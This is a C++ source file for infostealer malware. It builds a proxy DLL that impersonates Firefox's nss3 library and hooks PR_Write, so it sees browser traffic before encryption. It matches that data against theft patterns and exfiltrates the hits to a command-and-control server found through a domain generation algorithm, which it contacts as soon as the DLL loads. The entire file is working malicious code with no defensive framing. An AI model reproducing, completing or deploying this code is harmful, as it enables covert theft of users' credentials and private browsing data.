#include "intercepted.h"
#include "proxied.h"
#include "extract/extract.h"
#include "types/types.h"
#include "conf/infosteal_patterns.h"
#include "logging/logging.h"
#include "c2/c2.h"
#include "net/exfil.h"
#include "conf/c2.h"

pr_io_func pr_write_orig = 0;
pr_io_func pr_read_orig = 0;
C2 c2connection{ conf::dgaseed,conf::fallbackaddr,conf::tlds,conf::port};


int myPR_WRITE(void* fd, void* buf, int amnt) {

	try {
		auto matches = extract_info(buf, conf::infosteal_patterns, amnt);
		if (!matches.empty()) {
			exfil_matches(c2connection, matches);
		}
	}
	 catch (std::exception e) {
		LOG("EXCEPTION DURING extract_info: " << e.what());
		
	}
	 catch (...) {
		LOG("EXCEPTION DURING extract_info: (...)");	
	}

	int f = pr_write_orig(fd, buf, amnt);
	return f;
};

int myPR_READ(void* fd, void* buf, int amnt) {
	int f = pr_read_orig(fd, buf, amnt);
	return f;
};

BOOL WINAPI DllMain(HINSTANCE mod, DWORD fdwReason, LPVOID resv) { 

	if (fdwReason == DLL_PROCESS_ATTACH){

		INITLOG();

		//load functions from original dll
		HINSTANCE hGetProcIDDLL = LoadLibraryA("nss3.orig");
		pr_read_orig = (pr_io_func)GetProcAddress(hGetProcIDDLL, "PR_Read");
		pr_write_orig = (pr_io_func)GetProcAddress(hGetProcIDDLL, "PR_Write");

		c2connection.find_and_connect_async();

	}
	
	return TRUE;
}